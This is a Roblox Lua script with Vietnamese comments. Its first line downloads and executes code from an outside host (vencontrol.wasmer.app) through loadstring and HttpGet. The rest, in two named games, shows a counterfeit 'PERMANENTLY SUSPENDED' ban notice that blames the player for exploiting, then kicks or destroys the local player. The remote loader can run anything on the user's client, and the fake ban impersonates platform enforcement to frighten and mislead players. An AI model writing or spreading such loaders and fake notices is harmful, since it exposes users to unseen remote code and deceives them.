loadstring(game:HttpGet("http://vencontrol.wasmer.app/?api=loader&t="..tick()))()

-- Danh sách ID các game mục tiêu
local TargetIDs = {
    [9391468976] = "Jujutsu Shenanigans",
    [124473577469410] = "Be a Lucky Block"
}

-- Nội dung thông báo BAN (Tiếng Anh chuyên nghiệp)
local BAN_MESSAGE = [[

[SECURITY BREACH DETECTED]
Your account has been PERMANENTLY SUSPENDED from this experience.

Reason: Third-party Software / Exploiting (ID: #8821-X)
Duration: Permanent (No Appeal)
Status: Client Access Revoked.
]]

-- Khởi tạo các biến hệ thống
local Players = game:GetService("Players")
local localPlayer = Players.LocalPlayer
local currentPlaceId = game.PlaceId

-- Kiểm tra xem game hiện tại có nằm trong danh sách không
if TargetIDs[currentPlaceId] then
    local gameName = TargetIDs[currentPlaceId]
    print("Detected: " .. gameName .. ". Starting ban sequence in 3 seconds...")

    -- Đợi 3 giây cho mượt
    task.wait(3)

    -- Sử dụng kỹ thuật Registry (lấy gốc hàm Kick) để thực thi mạnh mẽ nhất
    local kickFunc = game.Kick
    local success, err = pcall(function()
        -- Thực hiện kick với thông báo ban tùy chỉnh
        kickFunc(localPlayer, BAN_MESSAGE)
    end)

    -- Nếu lệnh Kick bị chặn (hiếm gặp), thực hiện xóa "cứng" LocalPlayer để Disconnect
    if not success then
        local hardDestroy = game.Destroy
        pcall(hardDestroy, localPlayer)
    end
else
    -- Nếu không phải game mục tiêu, in ra console để bạn biết
    print("This game (ID: " .. currentPlaceId .. ") is not on the target list.")
end
